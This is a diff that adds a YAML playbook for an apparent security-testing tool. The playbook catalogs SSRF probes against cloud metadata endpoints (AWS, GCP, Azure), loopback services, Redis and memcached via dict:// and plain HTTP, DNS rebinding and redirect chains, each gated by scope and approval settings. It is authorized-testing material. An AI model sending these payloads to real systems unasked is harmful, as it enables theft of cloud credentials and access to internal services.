@@ -1,0 +1,117 @@
+schema: bugwolf-playbook-v1
+name: ssrf
+description: |
+  SSRF probes with operator-gated IMDS bypass. Mirrors the methodology
+  pattern from tools/methodology_playbook.py: scope entry for the target's
+  domain is mandatory before cloud metadata probes run, and protocol
+  smuggling is restricted to loopback/internal addresses that the scope
+  file already authorizes.
+preconditions:
+  target_is_reachable: true
+  scope_allows_active: true
+  scope_entry_for_target_domain: true
+  internal_reach_allowed: true
+payload_catalog:
+  - id: imds_aws
+    request:
+      method: GET
+      path: /?url=http://169.254.169.254/latest/meta-data/
+    expected_status: 200
+    expected_body_match: ami-id
+    sinks: [cloud_metadata, credential_leak]
+    requires_scope_verb: passive
+  - id: imds_aws_token
+    request:
+      method: PUT
+      path: /?url=http://169.254.169.254/latest/api/token
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [cloud_metadata, imdsv2]
+    requires_scope_verb: passive
+  - id: imds_gcp
+    request:
+      method: GET
+      path: /?url=http://metadata.google.internal/computeMetadata/v1/
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [cloud_metadata]
+    requires_scope_verb: passive
+  - id: imds_azure
+    request:
+      method: GET
+      path: /?url=http://169.254.169.254/metadata/instance
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [cloud_metadata]
+    requires_scope_verb: passive
+  - id: loopback_health
+    request:
+      method: GET
+      path: /fetch?url=http://127.0.0.1:8080/health
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [internal_reach]
+    requires_scope_verb: active
+  - id: protocol_smuggle
+    request:
+      method: GET
+      path: /fetch?url=http://127.0.0.1:11211/stats
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [internal_reach, protocol_smuggle]
+    requires_scope_verb: active
+  - id: dns_rebind_hint
+    request:
+      method: GET
+      path: /fetch?url=http://rebind.example.com/
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [dns_rebind]
+    requires_scope_verb: active
+  - id: scheme_whitelist_bypass
+    request:
+      method: GET
+      path: /fetch?url=dict://127.0.0.1:6379/info
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [scheme_bypass]
+    requires_scope_verb: active
+  - id: redirect_to_imds
+    request:
+      method: GET
+      path: /redirect?to=http://169.254.169.254/
+    expected_status: 302
+    expected_body_match: ""
+    sinks: [open_redirect_chain]
+    requires_scope_verb: active
+  - id: ipv6_loopback
+    request:
+      method: GET
+      path: /fetch?url=http://[::1]:8080/health
+    expected_status: 200
+    expected_body_match: ""
+    sinks: [internal_reach]
+    requires_scope_verb: active
+evidence_collection:
+  - type: response_capture
+    target: response
+  - type: timing_measurement
+    target: round_trip
+  - type: oast_callback
+    target: dns
+    config:
+      service: bugwolf_oast
+post_conditions:
+  finding_emitted: true
+  evidence_block_recorded: true
+  scope_entry_verified: true
+budget:
+  max_requests: 50
+  max_wall_clock: 120
+  min_interval_ms: 50
+governance:
+  requires_approval: true
+  scope_class: active
+  require_reproducible_evidence: true
+  destructive_allowed: false
+  notes: "All IMDS-bound probes require scope file entry for the target's domain."
